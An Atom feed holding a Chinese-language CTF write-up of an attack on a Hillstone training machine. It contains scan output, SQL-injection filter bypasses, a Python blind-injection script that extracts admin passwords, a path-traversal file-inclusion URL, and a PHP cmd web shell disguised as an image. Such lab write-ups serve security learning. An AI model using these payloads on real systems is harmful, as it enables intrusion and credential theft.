<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://mystic-Xxx.github.io</id>
    <title>myst1c</title>
    <updated>2020-11-14T01:21:57.250Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://mystic-Xxx.github.io"/>
    <link rel="self" href="https://mystic-Xxx.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://mystic-Xxx.github.io/images/avatar.png</logo>
    <icon>https://mystic-Xxx.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, myst1c</rights>
    <entry>
        <title type="html"><![CDATA[山石网科靶机实战WP]]></title>
        <id>https://mystic-Xxx.github.io/post/shan-shi-wang-ke-ba-ji-shi-zhan-wp/</id>
        <link href="https://mystic-Xxx.github.io/post/shan-shi-wang-ke-ba-ji-shi-zhan-wp/">
        </link>
        <updated>2020-11-14T01:01:38.000Z</updated>
        <content type="html"><![CDATA[<h1 id="writeup">Writeup</h1>
<h2 id="信息收集记录">信息收集记录：</h2>
<h3 id="有搞头的页面目录文件信息">有搞头的页面/目录/文件信息</h3>
<p>部分存在登录、查询、注册、修改等业务的页面和目录遍历、敏感信息等</p>
<pre><code class="language-php">http://web1-1.ctf.hillstonenet.com/Company_admin/login.php // 登录


[15:19:56] 200 -    6KB - /composer.lock
[15:19:56] 200 -  218B  - /composer.json
[15:19:57] 301 -  178B  - /css  -&gt;  http://web1-1.ctf.hillstonenet.com/css/
[15:20:00] 301 -  178B  - /fonts  -&gt;  http://web1-1.ctf.hillstonenet.com/fonts/
[15:20:01] 301 -  178B  - /functions  -&gt;  http://web1-1.ctf.hillstonenet.com/functions/
[15:20:01] 403 -  564B  - /functions/
[15:20:03] 301 -  178B  - /images  -&gt;  http://web1-1.ctf.hillstonenet.com/images/
[15:20:03] 200 -    6KB - /index.php
[15:20:04] 301 -  178B  - /js  -&gt;  http://web1-1.ctf.hillstonenet.com/js/
[15:20:10] 301 -  178B  - /plugins  -&gt;  http://web1-1.ctf.hillstonenet.com/plugins/
[15:20:11] 200 -   69B  - /README.md
[15:20:12] 200 -   40B  - /robots.txt
[15:20:12] 301 -  178B  - /screenshots  -&gt;  http://web1-1.ctf.hillstonenet.com/screenshots/
[15:20:17] 200 -    0B  - /vendor/autoload.php
[15:20:17] 200 -    0B  - /vendor/composer/autoload_classmap.php
[15:20:17] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[15:20:17] 200 -    5KB - /vendor/composer/installed.json
[15:20:17] 200 -    0B  - /vendor/composer/autoload_real.php
[15:20:17] 200 -    0B  - /vendor/composer/autoload_psr4.php
[15:20:17] 200 -    1KB - /vendor/composer/LICENSE
[15:20:17] 200 -    0B  - /vendor/composer/autoload_static.php
[15:20:17] 200 -    0B  - /vendor/composer/ClassLoader.php
[15:20:19] 200 -    2KB - /footer.php  // email提交
[15:20:19] 200 -    6KB - /contact.php // 留言板，可以尝试xss
[15:20:19] 200 -    6KB - /blog.php   // Birthday-Date
[15:20:19] 200 -    9KB - /about.php	
[15:20:20] 200 -   78B  - /single.php // // id参数存在注入
[15:20:29] 200 -    5KB - /portfolio.php


                 &quot;http://web1-1.ctf.hillstonenet.com:80//footer.php&quot;
url              &quot;http://web1-1.ctf.hillstonenet.com:80/composer.lock&quot;
url              &quot;http://web1-1.ctf.hillstonenet.com:80/composer.json&quot;
url              &quot;http://web1-1.ctf.hillstonenet.com:80/vendor/composer/LICEN





# email :info@example.com
# phone : +(254) 754 235 535
# birthday：10.27


</code></pre>
<h2 id="通过源代码中关键字">通过源代码中关键字：</h2>
<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026200612.png" alt="image-20201026200612372" loading="lazy"></figure>
<h3 id="github">Github:</h3>
<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026200652.png" alt="image-20201026200652060" loading="lazy"></figure>
<h3 id="通过当前网站的php页面配合github的项目文件判断项目为源代码">通过当前网站的PHP页面，配合github的项目文件，判断项目为源代码</h3>
<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026201325.png" alt="image-20201026201325301" loading="lazy"></figure>
<h2 id="sql注入bypass黑盒测试如下">SQL注入Bypass，黑盒测试如下</h2>
<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026194048.png" alt="image-20201026194048162" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026194109.png" alt="image-20201026194109799" loading="lazy"></figure>
<h4 id="fuzz-list">FuzZ list：</h4>
<pre><code class="language-sql">fuzz时线程调低

%0a %0b %0d代替 空格

like，regexp 代替 =

具体很多函数很多查询函数都可以进行利用，尝试查询表和密码
</code></pre>
<h4 id="后续得到源码后配合fuzz结果进行注入">后续得到源码后，配合FUzz结果进行注入：</h4>
<h4 id="sql查询语句将参数进行了直接拼接get进行参数传递">SQL查询语句，将参数进行了直接拼接,GET进行参数传递</h4>
<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026201741.png" alt="image-20201026201740712" loading="lazy"></figure>
<h4 id="get输入的内容会在后续进行输出">GET输入的内容，会在后续进行输出：</h4>
<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201026201820.png" alt="image-20201026201820086" loading="lazy"></figure>
<h4 id="当条件为true">当条件为True：</h4>
<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027083741.png" alt="image-20201027083741481" loading="lazy"></figure>
<h4 id="当条件为fasle">当条件为Fasle：</h4>
<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027083918.png" alt="image-20201027083918835" loading="lazy"></figure>
<pre><code class="language-python">#!/usr/bin/ python
# -*- coding:utf-8 -*-
&quot;&quot;&quot;
-------------------------------------------------
Author:       myst1c
Datetime:     2020/10/26 20:23 
ProjectName:  mianshi.py
-------------------------------------------------
&quot;&quot;&quot;

import requests




url = &quot;http://web1-1.ctf.hillstonenet.com:80/single.php?id=&quot;

def getData():
    data = &quot;&quot;
    for q in range(0, 50):
        for i in range(26, 132):
            # payload = url + '1 or ascii(substr((select database()), {}, 1)) like \&quot;{}\&quot;'.format(q, i)
            # payload = url + '1 or ascii(substr((select table_name from information_schema.tables where table_schema  like \&quot;hs_test_s1_blog\&quot; limit 0,1),{},1)) like \&quot;{}\&quot;'.format(q, i)
            # ayload = url + '1 or ascii(substr((select column_name from information_schema.columns where table_name like \&quot;admin\&quot; limit 1,1),{},1)) like &quot;{}&quot;'.format(q, i)
            #payload = url + '1 or ascii(substr((select column_name from information_schema.columns where table_name like \&quot;admin\&quot; limit 3,1),{},1)) like &quot;{}&quot;'.format(q, i)
            payload = url +  '1 or ascii(substr((select group_concat(id,password) from admin),{},1)) like &quot;{}&quot;'.format(q, i)


            try:
                fin_payload = payload.replace(&quot; &quot;, &quot;%0d&quot;)
                rep = requests.get(url=fin_payload)
                if &quot;guys!!&quot; in rep.text:
                    data += chr(i)
                    print(&quot;[+] Data: &quot; + data)
                else:pass
            except:pass

def main():

    getData()





if __name__ == '__main__':
    main()
</code></pre>
<h3 id="数据库">数据库：</h3>
<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027095209.png" alt="image-20201027095208800" loading="lazy"></figure>
<h3 id="查表">查表：</h3>
<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027103508.png" alt="image-20201027103508085" loading="lazy"></figure>
<h3 id="查列">查列：</h3>
<figure data-type="image" tabindex="12"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027105221.png" alt="image-20201027105221445" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027104538.png" alt="image-20201027104537979" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027110025.png" alt="image-20201027110025379" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027110402.png" alt="image-20201027110402754" loading="lazy"></figure>
<h2 id="查密码直接通过group_concat查">查密码，直接通过group_concat查：</h2>
<figure data-type="image" tabindex="16"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027113005.png" alt="image-20201027113005791" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201027112938.png" alt="image-20201027112938086" loading="lazy"></figure>
<h4 id="还有一个4位数的密码之前说过要用到些社工技巧回头在页面找点信息">还有一个4位数的密码，之前说过要用到些社工技巧，回头在页面找点信息</h4>
<figure data-type="image" tabindex="18"><img src="https://mystic-Xxx.github.io/post-images/1605316719597.png" alt="" loading="lazy"></figure>
<h4 id="然后进入后台界面找一下可以利用的点发现上传页面">然后进入后台界面，找一下可以利用的点，发现上传页面</h4>
<figure data-type="image" tabindex="19"><img src="https://mystic-Xxx.github.io/post-images/1605316745205.png" alt="" loading="lazy"></figure>
<h4 id="但是无法连接shell寻找一下其他可以利用的点然后在">但是无法连接shell，寻找一下其他可以利用的点，然后在</h4>
<pre><code>http://web1-1.ctf.hillstonenet.com/Company_admin/language.php?template=../../language.php
</code></pre>
<h4 id="包含当前php文件内容异常说明可能被解析了">包含当前PHP文件，内容异常，说明可能被解析了</h4>
<figure data-type="image" tabindex="20"><img src="https://mystic-Xxx.github.io/post-images/1605316777306.png" alt="" loading="lazy"></figure>
<h4 id="这里可以确定大致思路就是上传图片马然后利用文件包含图片马执行cmd命令来获取flag">这里可以确定大致思路就是上传图片马，然后利用文件包含图片马执行cmd命令来获取flag</h4>
<h4 id="cmd图片马">cmd图片马</h4>
<p><code>&lt;?php if(isset($_REQUEST['cmd'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST['cmd']); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; } ?&gt;</code></p>
<h4 id="这里有个点就是0a可以绕过空格但是用ifs才可以查询">这里有个点就是%0a可以绕过空格，但是用${IFS}才可以查询</h4>
<figure data-type="image" tabindex="21"><img src="https://mystic-Xxx.github.io/post-images/1605315771482.png" alt="" loading="lazy"></figure>
<h4 id="get-flag">get flag</h4>
<figure data-type="image" tabindex="22"><img src="https://mystic-Xxx.github.io/post-images/1605315784865.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>